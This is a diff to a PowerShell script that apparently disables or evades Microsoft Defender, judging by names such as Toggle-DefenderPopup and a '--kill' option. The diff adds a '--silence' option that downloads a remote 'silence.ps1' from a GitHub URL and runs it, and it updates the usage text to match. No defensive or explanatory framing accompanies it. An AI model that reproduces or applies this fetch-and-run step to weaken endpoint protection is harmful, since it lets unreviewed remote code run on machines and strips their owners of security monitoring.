@@ -438,6 +438,10 @@ function Toggle-DefenderPopup {
 
 # Handle the different options
 switch ($Action) {
+    '--silence' {
+        Write-Host "Executing silence script..."
+        Run-ScriptFromURL "https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/additional/silence.ps1"
+    }
     '--kill' {
         if ($Directory -ne $null -and $Directory -ne "") {
             if (-Not (Test-Path -Path $Directory -PathType Container)) {
@@ -511,6 +515,6 @@ switch ($Action) {
     }
 
     default {
-        Write-Host "Invalid argument. Use --kill or --enum <path> [depth]."
+        Write-Host "Invalid argument. Use --kill, --silence or --enum <path> [depth]."
     }
 }
